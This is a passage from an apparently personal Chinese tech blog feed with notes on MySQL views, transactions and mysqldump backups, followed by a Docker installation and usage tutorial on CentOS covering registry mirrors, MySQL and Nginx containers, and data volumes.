SHOW&#x2F;SELECT&#x2F;DESC"></a>查 SHOW&#x2F;SELECT&#x2F;DESC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW TABLES</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM 视图名称;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DESC / DESCRIBE 视图名称;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW CREATE VIEW 视图名称;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">SHOW</span> <span class="variable constant_">TABLE</span> <span class="variable constant_">STATUS</span> <span class="variable constant_">LIKE</span> <span class="string">&#x27;view_name&#x27;</span>\G;</span><br><span class="line"></span><br><span class="line">-- <span class="title class_">Name</span>和<span class="title class_">Comment</span>之外，其余的信息均为<span class="variable constant_">NULL</span>, 且<span class="title class_">Comment</span> = <span class="variable constant_">VIEW</span>,则表示此表为视图</span><br></pre></td></tr></table></figure><p>视图数据的增删改查与<strong>TABLE</strong>一样，将表名换成视图名</p><h2 id="事务-TRANSACTION"><a href="#事务-TRANSACTION" class="headerlink" title="事务 TRANSACTION"></a>事务 TRANSACTION</h2><p>用来管理 <strong>insert、update、delete</strong> 语句</p><p><strong>保证成批的 SQL 语句要么全部执行，要么全部不执行</strong></p><h3 id="事务处理主要有两种方法："><a href="#事务处理主要有两种方法：" class="headerlink" title="事务处理主要有两种方法："></a>事务处理主要有两种方法：</h3><p>1、用 BEGIN, ROLLBACK, COMMIT 来实现</p><ul><li><strong>BEGIN 或 START TRANSACTION</strong>：开用于开始一个事务。</li><li><strong>ROLLBACK</strong> 事务回滚，取消之前的更改。</li><li><strong>COMMIT</strong>：事务确认，提交事务，使更改永久生效。</li></ul><p>2、直接用 SET 来改变 MySQL 的自动提交模式:</p><ul><li><strong>SET AUTOCOMMIT&#x3D;0</strong> 禁止自动提交</li><li><strong>SET AUTOCOMMIT&#x3D;1</strong> 开启自动提交</li></ul><p><strong>BEGIN 或 START TRANSACTION</strong> – 用于开始一个事务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BEGIN; -- 或者使用 START TRANSACTION;</span><br></pre></td></tr></table></figure><p><strong>COMMIT</strong> – 用于提交事务，将所有的修改永久保存到数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COMMIT;</span><br></pre></td></tr></table></figure><p><strong>ROLLBACK</strong> – 用于回滚事务，撤销自上次提交以来所做的所有更改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROLLBACK;</span><br></pre></td></tr></table></figure><p><strong>SAVEPOINT</strong> – 用于在事务中设置保存点，以便稍后能够回滚到该点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SAVEPOINT savepoint_name;</span><br></pre></td></tr></table></figure><p><strong>ROLLBACK TO SAVEPOINT</strong> – 用于回滚到之前设置的保存点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROLLBACK TO SAVEPOINT savepoint_name;</span><br></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-- 开始事务</span><br><span class="line">START TRANSACTION;</span><br><span class="line"></span><br><span class="line">-- 执行一些SQL语句</span><br><span class="line">UPDATE accounts SET balance = balance - 100 WHERE user_id = 1;</span><br><span class="line">UPDATE accounts SET balance = balance + 100 WHERE user_id = 2;</span><br><span class="line"></span><br><span class="line">-- 判断是否要提交还是回滚</span><br><span class="line">IF (条件) THEN</span><br><span class="line">    COMMIT; -- 提交事务</span><br><span class="line">ELSE</span><br><span class="line">    ROLLBACK; -- 回滚事务</span><br><span class="line">END IF;</span><br></pre></td></tr></table></figure><h3 id="隔离级别"><a href="#隔离级别" class="headerlink" title="隔离级别"></a>隔离级别</h3><p>READ UNCOMMITTED</p><p>READ COMMITTED</p><p>REPEATABLE READ </p><p>SERIALIZABLE</p><h2 id="复制备份"><a href="#复制备份" class="headerlink" title="复制备份"></a>复制备份</h2><h3 id="复制数据库"><a href="#复制数据库" class="headerlink" title="复制数据库"></a>复制数据库</h3><p>mysqldump 是 MySQL 自带的一种备份工具，可以将数据库备份为<code>.sql</code> 格式的文件。</p><p>当备份和恢复时，需要<strong>停止数据库</strong>，否则数据可能会因为正在进行的更改而不一致。</p><h4 id="完整的数据库"><a href="#完整的数据库" class="headerlink" title="完整的数据库"></a><strong>完整的数据库</strong></h4><p>1.复制一个<strong>完整的数据库</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u 用户名 -p 数据库名 &gt; 备份文件名.sql</span><br></pre></td></tr></table></figure><p>2.将备份文件复制到另一台机器上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u 用户名 -p 目标数据库名 &lt; 备份文件名.sql</span><br></pre></td></tr></table></figure><h4 id="复制指定表"><a href="#复制指定表" class="headerlink" title="复制指定表"></a>复制指定表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u 用户名 -p 数据库名 表名1 表名2 &gt; 备份文件名.sql</span><br></pre></td></tr></table></figure><h4 id="备份压缩"><a href="#备份压缩" class="headerlink" title="备份压缩"></a>备份压缩</h4><p>1.备份压缩</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u 用户名 -p 数据库名 | gzip &gt; 备份文件名.gz</span><br></pre></td></tr></table></figure><p>2.解压还原</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip &lt; 备份文件名.gz | mysql -u 用户名 -p 数据库名</span><br></pre></td></tr></table></figure><h3 id="复制表"><a href="#复制表" class="headerlink" title="复制表"></a>复制表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- 在目标数据库上创建与源数据库相同的表格结构</span><br><span class="line">CREATE TABLE IF NOT EXISTS 目标数据库.表 LIKE 原数据库.表;</span><br><span class="line"> </span><br><span class="line">-- 从源数据库复制数据到目标数据库的新表格</span><br><span class="line">INSERT INTO 目标数据库.表 (SELECT * FROM 原数据库.表);</span><br></pre></td></tr></table></figure><p>详细：（若使用 <strong>INSERT INTO语句</strong>，需要先创建新表，再插入）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-- 不会将旧表中的一些主键等，Extra（auto_increament）等属性复制，但会将旧表中的所有内容都拷贝过来</span><br><span class="line">CREATE TABLE 新表 SELECT * FROM 旧表;</span><br><span class="line">-- 会创建一个新表并复制旧表的结构，包括列名、数据类型、索引等，但是不会复制旧表的数据和约束。</span><br><span class="line">-- 也不会自动复制旧表的主键、外键和唯一性约束等属性，和前一种一样，只不过第一种多了一个表数据</span><br><span class="line">CREATE TABLE 新表 LIKE 旧表;</span><br><span class="line"></span><br><span class="line">-- 单纯复制旧表的数据到新表（前提两个表结构相同）</span><br><span class="line">INSERT INTO 新表 (SELECT * FROM 旧表);</span><br><span class="line">-- 单纯复制旧表的指定的数据到新表（两个表结构可以不一样, 字段得对上）</span><br><span class="line">INSERT INTO 新表 （字段1，字段2，,,,,,,,,） (SELECT 字段1 ， 字段2 FROM 旧表);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Linux基础命令介绍</summary>
    
    
    
    <category term="服务端" scheme="https://hisai3.github.io/hisai3.github.io/categories/%E6%9C%8D%E5%8A%A1%E7%AB%AF/"/>
    
    
    <category term="MySQL" scheme="https://hisai3.github.io/hisai3.github.io/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/11/20/Docker/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/11/20/Docker/</id>
    <published>2023-11-20T03:50:32.066Z</published>
    <updated>2023-12-13T01:59:31.595Z</updated>
    
    <content type="html"><![CDATA[<p><strong><a href="https://docs.docker.com/engine/install/centos/">安装Docker</a></strong></p><h1 id="1-卸载旧版"><a href="#1-卸载旧版" class="headerlink" title="1.卸载旧版"></a>1.卸载旧版</h1><p>首先如果系统中已经存在旧的Docker，则先卸载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yum remove docker \</span><br><span class="line">    docker-client \</span><br><span class="line">    docker-client-latest \</span><br><span class="line">    docker-common \</span><br><span class="line">    docker-latest \</span><br><span class="line">    docker-latest-logrotate \</span><br><span class="line">    docker-logrotate \</span><br><span class="line">    docker-engine</span><br></pre></td></tr></table></figure><h1 id="2-配置Docker的yum库"><a href="#2-配置Docker的yum库" class="headerlink" title="2.配置Docker的yum库"></a>2.配置Docker的yum库</h1><p>首先要安装一个yum工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y yum-utils</span><br></pre></td></tr></table></figure><p>安装成功后，执行命令，配置Docker的yum源：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><h1 id="3-安装Docker"><a href="#3-安装Docker" class="headerlink" title="3.安装Docker"></a>3.安装Docker</h1><p>最后，执行命令，安装Docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br></pre></td></tr></table></figure><h1 id="4-启动和校验"><a href="#4-启动和校验" class="headerlink" title="4.启动和校验"></a>4.启动和校验</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动Docker</span></span><br><span class="line">systemctl start docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止Docker</span></span><br><span class="line">systemctl stop docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">systemctl restart docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置开机自启</span></span><br><span class="line">systemctl <span class="built_in">enable</span> docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行docker ps命令，如果不报错，说明安装启动成功</span></span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure><h1 id="5-配置镜像加速"><a href="#5-配置镜像加速" class="headerlink" title="5.配置镜像加速"></a>5.配置镜像加速</h1><p>这里以阿里云镜像加速为例。</p><h2 id="5-1-注册阿里云账号"><a href="#5-1-注册阿里云账号" class="headerlink" title="5.1.注册阿里云账号"></a>5.1.注册阿里云账号</h2><p>首先访问阿里云网站:</p><p><a href="https://www.aliyun.com/">https://www.aliyun.com/</a></p><p>注册一个账号。</p><h2 id="5-2-开通镜像服务"><a href="#5-2-开通镜像服务" class="headerlink" title="5.2.开通镜像服务"></a>5.2.开通镜像服务</h2><p>在首页的产品中，找到阿里云的<strong>容器镜像服务</strong>：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/318962379f5b4d9a817832d201da401d~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=1437&h=569&s=60199&e=png&b=fefefe" alt="img"></p><p>点击后进入控制台：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/739b22d4c8054b398dbc37a9554ad5de~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=1435&h=500&s=327124&e=png&b=faf9f9" alt="img"></p><p>首次可能需要选择立刻开通，然后进入控制台。</p><h2 id="5-3-配置镜像加速"><a href="#5-3-配置镜像加速" class="headerlink" title="5.3.配置镜像加速"></a>5.3.配置镜像加速</h2><p>找到<strong>镜像工具</strong>下的<strong>镜像****加速器</strong>：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9d6f5416513948409a8bb2257c28ea1d~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=1384&h=650&s=73284&e=png&b=fbf7f7" alt="img"></p><p>页面向下滚动，即可找到配置的文档说明：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/97726bcff26148248aa8881030cad4e3~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=1400&h=803&s=86320&e=png&b=fafafa" alt="img"></p><p>具体命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建目录</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制内容，注意把其中的镜像加速地址改成你自己的</span></span><br><span class="line"><span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://xxxx.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新加载配置</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启Docker</span></span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h1 id="Docker安装过程出现的问题"><a href="#Docker安装过程出现的问题" class="headerlink" title="Docker安装过程出现的问题"></a>Docker安装过程出现的问题</h1><h2 id="1-Centos8安装Docker出现和Podman冲突"><a href="#1-Centos8安装Docker出现和Podman冲突" class="headerlink" title="1.Centos8安装Docker出现和Podman冲突"></a>1.Centos8安装Docker出现和Podman冲突</h2><p><strong>冲突</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">package podman-3.3.1-9.module_el8.5.0+988+b1f0b741.x86_64 requires runc &gt;= 1.0.0-57, but none of the providers can be installed</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>1.查看是否安装 Podman</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost odc]<span class="comment"># rpm -q podman</span></span><br><span class="line">podman-2.0.5-5.module_el8.3.0+512+b3b58dca.x86_64</span><br></pre></td></tr></table></figure><p>2.删除之后在重新yum install docker-ce下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost odc]<span class="comment"># dnf remove podman</span></span><br></pre></td></tr></table></figure><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum erase podman buildah</span><br></pre></td></tr></table></figure><p>然后一路y 完事后重新安装 docker-ce</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><blockquote><p>当我们利用 Docker 安装应用时， Docker 会自动搜索并下载应用 <strong>镜像（ image ）</strong> 。镜像不仅包含应用本身，还包含应用运行所需要的环境、配置、系统函数库。 Docker 会在运行镜像时创建一个隔离环境，称为 <strong>容器（ container ）</strong></p></blockquote><p><strong>镜像：</strong> 将应用所需的函数库、依赖、配置等与应用一起打包得到的就是镜像</p><p><strong>容器：</strong> 为每个镜像的应用进程创建的隔离运行环境就是容器</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d69083b3d7dc42c6a0d1abe9df2624fd~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=792&h=286&s=73182&e=png&b=ffffff" alt="image.png"></p><h2 id="虚拟机重新运行之后错误提示"><a href="#虚拟机重新运行之后错误提示" class="headerlink" title="虚拟机重新运行之后错误提示"></a>虚拟机重新运行之后错误提示</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~<span class="comment"># docker images</span></span><br><span class="line">Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?</span><br></pre></td></tr></table></figure><p><strong>解决</strong></p><p>1.首先确认是否启动了docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~<span class="comment"># systemctl status docker</span></span><br></pre></td></tr></table></figure><p>如上图所示，就是docker没有启动，使用如下命令启动docker后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~<span class="comment"># systemctl start docker</span></span><br></pre></td></tr></table></figure><p>2.重新检查docker进程是否存在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~<span class="comment"># systemctl status docker</span></span><br></pre></td></tr></table></figure><p><strong>docker 开机自启</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Docker开机自启</span></span><br><span class="line">systemctl <span class="built_in">enable</span> docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># Docker容器开机自启</span></span><br><span class="line">docker update --restart=always [容器名/容器<span class="built_in">id</span>]</span><br></pre></td></tr></table></figure><h2 id="安装-MySQL"><a href="#安装-MySQL" class="headerlink" title="安装 MySQL"></a>安装 MySQL</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \  </span><br><span class="line">--name mysql \  </span><br><span class="line">-p 3306:3306 \  </span><br><span class="line">-e TZ=Asia/Shanghai \  </span><br><span class="line">-e MYSQL_ROOT_PASSWORD=123 \  </span><br><span class="line">mysql</span><br></pre></td></tr></table></figure><h3 id="命令解读"><a href="#命令解读" class="headerlink" title="命令解读"></a>命令解读</h3><p>docker run ：创建并运行一个容器， <strong>-d</strong> 是让容器在后台运行<br>–name mysql ：给容器起个名字，必须唯一<br>-p 3306:3306 ：设置端口映射 <strong>虚拟机端口&#x2F;MySQL容器端口</strong><br>-e KEY&#x3D;VALUE ：是设置环境变量<br>mysql ：指定运行的镜像的名字, 规范 <strong>[repository]:[tag]</strong>, 没有指定 <strong>tag</strong> 默认最新版本</p><h2 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h2><p><a href="https://docs.docker.com/engine/reference/commandline/cli/">docker 文档</a></p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/11999a84a0df4523a079a9268023d993~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=757&h=334&s=36212&e=png&b=fefefe" alt="image.png"></p><p><code>docker run</code> 会创建容器并运行<br><code>docker start</code> 启动停止运行的容器进程<br><code>docker stop</code> 停止运行中的容器进程<br><code>docker ps</code> 查看容器运行情况<br><code>docker inspect</code> 查看容器情况<br><code>docker rm</code> 删除容器<br><code>docker logs</code> 查看日志<br><code>docker exec</code> 进入容器运行的环境  </p><h3 id="案例：-安装Nginx"><a href="#案例：-安装Nginx" class="headerlink" title="案例： 安装Nginx"></a><strong>案例：</strong> 安装Nginx</h3><blockquote><p>查看 <strong>DockerHub</strong> ，拉取 <strong>Nginx 镜像</strong>，创建并运行 <strong>Nginx 容器</strong></p></blockquote><p>• 在 DockerHub 中搜索 Nginx 镜像，查看镜像的名称<br>• 拉取 Nginx 镜像 <code>docker pull nginx</code><br>• 查看本地镜像列表 <code>docker images</code><br><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5c4c8f32f70943999757ffab6fc7ff29~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=703&h=93&s=93252&e=png&b=011e38" alt="image.png"><br>• 创建并运行 Nginx 容器  <code>docker run -d --name nginx -p 80:80 nginx</code><br>• 查看容器 <code>docker ps</code>, 默认只查看当前运行中的容器，末尾加上 -a 表示查看全部<br>• 对查看输出信息格式化 <code>docker ps --format &quot;table &#123;&#123;.ID&#125;&#125;\t&#123;&#123;.Image&#125;&#125;\t&#123;&#123;.Ports&#125;&#125;\t&#123;&#123;.Status&#125;&#125;\t&#123;&#123;.Names&#125;&#125;&quot;</code><br>• 查看日志 <code>docker logs -f nginx</code>, <code>-f</code> 表示实时查看(在网页上打开宿主机的ip即可访问到nginx页面)，<code>ctrl + c</code>停止查看<br>• 停止容器 <code>docker stop nginx</code><br>• 再次启动容器 <code>docker start nginx</code><br>• 进入容器<br> <code>docker exec -it nginx bash</code><br><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/64f14ace08f2476e94a4f108f6e2e8bb~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=467&h=93&s=59010&e=png&b=011f39" alt="image.png"><br>• 退出容器 <code>exit</code><br>• 删除容器 <code>docker rm nginx</code>, <code>-f</code> 强制删除<br>• 保存镜像到本地 <code>docker save -o nginx.tar nginx:latest</code><br>• 删除镜像 <code>docker rmi nginx</code><br>• 重新加载nginx.tar本地镜像 <code>docker load -i nginx.tar</code>  </p><h2 id="命令别名设置"><a href="#命令别名设置" class="headerlink" title="命令别名设置"></a>命令别名设置</h2><ol><li>修改 bashrc， <code>vi ~/.bashrc</code><br><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5c1bd59a8d994ebdb2d313db61646e76~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=922&h=271&s=112230&e=png&b=001f39" alt="image.png"></li><li>重新启动 bashrc， <code>source ~/.bashrc</code></li></ol><h2 id="数据卷"><a href="#数据卷" class="headerlink" title="数据卷"></a>数据卷</h2><p>数据卷是一个<strong>虚拟目录</strong>，它将宿主机目录映射到容器内目录，方便我们操作容器内文件，或者方便迁移容器产生的数据</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0043a6b39ec8449a880830269d26e7e0~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=815&h=342&s=49220&e=png&b=fefefe" alt="image.png"></p><p><strong>挂载数据卷</strong></p><ol><li>在创建容器时，利用 <code>-v</code> <strong>数据卷名：容器内目录</strong>完成挂载  </li><li>容器创建时，如果发现挂载的数据卷不存在时，会自动创建</li><li>一个容器可以挂载多个目录，一个目录也可以被多个容器挂载。  </li><li>如果创建容器时忘记挂载，是无法再去挂载数据卷的。只能删除容器，再创建新容器时挂载数据卷。</li></ol><p><code>docker volume create</code> 创建数据卷<br><code>docker volume ls</code> 查看所有数据卷<br><code>docker volume rm</code> 删除指定数据卷<br><code>docker volume inspect</code> 查看某个数据卷的详情<br><code>docker volume prune</code> 清除数据卷  </p><h3 id="案例1：-利用-Nginx-容器部署静态资源"><a href="#案例1：-利用-Nginx-容器部署静态资源" class="headerlink" title="案例1： 利用 Nginx 容器部署静态资源"></a><strong>案例1：</strong> 利用 Nginx 容器部署静态资源</h3><p>• 创建 Nginx 容器，修改 nginx 容器内的 html 目录下的 index.html 文件，查看变化<br>• 将静态资源部署到 nginx 的 html 目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name nginx -p 80:80 -v html:/usr/share/nginx/html nginx</span><br><span class="line"></span><br><span class="line">docker volume <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">docker volume inspect html</span><br><span class="line"><span class="comment">#[</span></span><br><span class="line"><span class="comment">#    &#123;</span></span><br><span class="line"><span class="comment">#        &quot;CreatedAt&quot;: &quot;2023-11-25T08:00:51-05:00&quot;,</span></span><br><span class="line"><span class="comment">#        &quot;Driver&quot;: &quot;local&quot;,</span></span><br><span class="line"><span class="comment">#        &quot;Labels&quot;: null,</span></span><br><span class="line"><span class="comment">#        &quot;Mountpoint&quot;: &quot;/var/lib/docker/volumes/html/_data&quot;,</span></span><br><span class="line"><span class="comment">#        &quot;Name&quot;: &quot;html&quot;,</span></span><br><span class="line"><span class="comment">#        &quot;Options&quot;: null,</span></span><br><span class="line"><span class="comment">#        &quot;Scope&quot;: &quot;local&quot;</span></span><br><span class="line"><span class="comment">#    &#125;</span></span><br><span class="line"><span class="comment">#]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意 需要使用root账号，否则 sudo 也没用</span></span><br><span class="line"><span class="built_in">cd</span> /var/lib/docker/volumes/html/_data</span><br><span class="line"></span><br><span class="line">vi inde.html</span><br></pre></td></tr></table></figure><h3 id="案例2：-mysql-容器的数据卷挂载（本地目录形式）"><a href="#案例2：-mysql-容器的数据卷挂载（本地目录形式）" class="headerlink" title="案例2： mysql 容器的数据卷挂载（本地目录形式）"></a><strong>案例2：</strong> mysql 容器的数据卷挂载（本地目录形式）</h3><p>• 查看 mysql 容器，判断是否有数据卷挂载<br>• 基于<strong>宿主机目录</strong>实现 MySQL 数据目录、配置文件、初始化脚本的挂载（查阅官方镜像文档） </p><p>① 挂载 &#x2F;root&#x2F;mysql&#x2F;data 到容器内的 &#x2F;var&#x2F;lib&#x2F;mysql 目录<br>② 挂载 &#x2F;root&#x2F;mysql&#x2F;init 到容器内的 &#x2F;docker-entrypoint-initdb.d 目录，携带课前资料准备的 SQL 脚本<br>③ 挂载 &#x2F;root&#x2F;mysql&#x2F;conf 到容器内的 &#x2F;etc&#x2F;mysql&#x2F;conf.d 目录，携带课前资料准备的配置文件</p><p>在执行 docker run 命令时， 使用 <code>-v 本地目录:容器目录</code> 完成本地目录挂载<br>本地目录必须以 ‘&#x2F;’ 或者 ‘.&#x2F;’ 开头，如果直接以名称开头会被默认识别为数据卷而非本地目录</p><p><strong>例如：</strong> </p><ul><li>-v mysql:&#x2F;var&#x2F;lib&#x2F;mysql 会被识别为一个叫mysql的数据卷  </li><li>-v .&#x2F;mysql:&#x2F;var&#x2F;lib&#x2F;mysql 会被识别为当前目录下的mysql目录</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 确认是否挂载了数据卷，找到 mount</span></span><br><span class="line">docker inspect mysql</span><br><span class="line"></span><br><span class="line"><span 